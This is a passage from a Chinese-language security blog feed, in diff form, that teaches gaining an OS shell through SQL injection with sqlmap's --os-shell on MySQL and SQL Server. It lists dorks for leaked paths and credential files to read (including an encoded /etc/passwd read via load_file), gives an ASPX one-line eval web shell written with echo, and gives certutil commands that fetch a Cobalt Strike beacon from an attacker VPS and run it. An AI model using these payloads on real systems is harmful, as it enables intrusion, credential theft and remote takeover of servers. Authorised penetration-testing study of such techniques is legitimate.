-    <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
-<li><p>拥有dba权限</p>
-</li>
-<li><p>网站的绝对路径</p>
-</li>
-<li><p>高版本的mysql需要 <code>show variables like &#39;%secure_file_priv%&#39;</code> 或者<code>select </code></p>
-<p> <code>@@secure;</code>或者<code>show global variables like &#39;%secure%&#39;;</code>的结果符合要求，secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。这个参数只能通过修改配置文件后重启mysql修改</p>
-<ul>
-<li>如果该变量为空，则变量无效，这时候最容易利用</li>
-<li>如果变量为目录的绝对路径，则服务器会将导入和导出操作限制为仅适用于该目录中的文件</li>
-<li>如果设置为NULL，则服务器禁用导入和导出操作。</li>
-</ul>
-</li>
-<li><p>当为php时，magic_quotes_gpc为off，php主动转义的功能关闭**</p>
-</li>
-</ol>
-<p>当执行 –os-shell时，这个时候sqlmap主要做了三件事情：</p>
-<ol>
-<li>进行目标的一个基础信息的探测。</li>
-<li>上传shell到目标web网站上（sqlmap会自动生成两个文件，一个用于命令执行，一个用于上传文件）</li>
-<li>退出时删除shell。</li>
-</ol>
-<h3 id="寻找绝对路径"><a href="#寻找绝对路径" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><ol>
-<li><p>通过网站报错信息查看绝对路径</p>
-</li>
-<li><p>通过搜索引擎获取</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google语法：site:baidu.com warning</span><br><span class="line">site:baidu.com  &quot;fatal error&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>配置文件获取路径<br> 如果注入点有文件读取权限，就可以通过load_file函数读取配置文件，再从中寻找路径信息。</p>
-</li>
-</ol>
-<p>  Sqlmap 下可以使用–sql-shell 获取一个sql命令执行窗口，使用load_file(‘文件名’)读取文件</p>
-<p>  也可以使用 –file-read&#x3D;文件名 ，读取文件</p>
-<p>sqlmap -u ‘url’ –batch –file-read&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</p>
-<ul>
-<li><p><strong>win 下常见的敏感文件</strong></p>
-<p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">常用的绝对路径收集</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:/boot.ini //查看系统版本 </span><br><span class="line">c:/windows/php.ini //php配置信息 </span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 </span><br><span class="line">//存储了pcAnywhere的登陆密码 </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 </span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. </span><br><span class="line">c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br><span class="line">c:\windows\php.ini      php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml    IIS虚拟主机配置文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>Linux 下常见的敏感文件</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 </span><br><span class="line">/usr/local/apache2/conf/httpd.conf </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略 </span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件 </span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件 </span><br><span class="line">/etc/my.cnf //mysql的配置文件 </span><br><span class="line">/etc/redhat-release //系统版本 </span><br><span class="line">/etc/issue </span><br><span class="line">/etc/issue.net </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件 </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 </span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略 </span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 </span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line">etc/php.ini          php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf        Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf  虚拟目录配置文件</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>通过执行</strong><code>select @@datadir;</code> 获取数据库数据保存的位置、 <code>select @@basedir;</code> 安装位置、<code>select @@plugin_dir</code> mysql plugin目录</p>
-<p>可能会有一些关键信息，然后对关键信息搜索，查找默认路径</p>
-</li>
-</ul>
-<p>	</p>
-<h3 id="执行–os-shell"><a href="#执行–os-shell" class="headerlink" title="执行–os-shell"></a>执行–os-shell</h3><p>成功后会在网站绝对路径下，生成两个文件，一个可以上传，一个可以执行命令。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p>
-<h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ul>
-<li>数据库支持外连</li>
-<li>数据库权限为SA权限</li>
-</ul>
-<p>Sqlserver –os-shell主要是利用<code>xp_cmdshell</code>扩展进行命令执行。</p>
-<p>当执行–os-shell 时，这个时候sqlmap主要做了三件事情：</p>
-<ol>
-<li>识别当前数据库类型，然后打印出来。</li>
-<li>检测是否为数据库dba，也就是查看是否为sa权限。</li>
-<li>检测是否开启了xp_cmdshell，如果没有开启sqlmap就会尝试开启。</li>
-</ol>
-<h3 id="寻找绝对路径-1"><a href="#寻找绝对路径-1" class="headerlink" title="寻找绝对路径"></a>寻找绝对路径</h3><p>可以上传一个复杂文件名的文件，比如：l12asd3123_0sads7_08.jpg</p>
-<p>或者在网站中找到一个复杂的文件名，觉得会是唯一的，通过命令查找</p>
-<p>sqlmap  –os-shell 下使用，以下任意一条命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r e:\ %i in (1*.php) do @echo %i  *必加</span><br><span class="line">dir c:\ d:\  /s /b | find &quot;icon_assignment.gif&quot;</span><br></pre></td></tr></table></figure>
-
-<p>查找文件</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p>
-<h3 id="上一句话马或者连cs"><a href="#上一句话马或者连cs" class="headerlink" title="上一句话马或者连cs"></a>上一句话马或者连cs</h3><h4 id="写一句话木马"><a href="#写一句话木马" class="headerlink" title="写一句话木马"></a>写一句话木马</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p>
-<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>使用 <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p>
-<p>a32.exe 执行， 有时执行不成功饭是因为权限不够，可以下载到有执行权限的目录（假如c:&#x2F;temp&#x2F; ，有权限，<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在有拥有dba权限后，</p>
-<ul>
-<li>mysql拿shell的难点在于寻找绝对路径</li>
-<li>sqlserver在于xp_cmdshell 是否开启。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>安全工具</category>
-      </categories>
-      <tags>
-        <tag>sqlmap使用</tag>
-        <tag>getshell</tag>
       </tags>
   </entry>
   <entry>
